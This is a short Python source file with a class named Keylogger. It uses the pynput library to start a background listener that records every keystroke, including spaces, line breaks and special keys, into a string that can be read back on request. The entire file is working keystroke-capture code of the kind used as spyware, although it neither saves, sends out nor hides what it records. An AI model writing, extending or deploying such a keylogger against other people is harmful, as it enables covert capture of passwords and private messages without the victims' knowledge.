import pynput.keyboard as keyboard
import time
import json

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = None

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f"[{key}]"

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_log(self):
        return self.log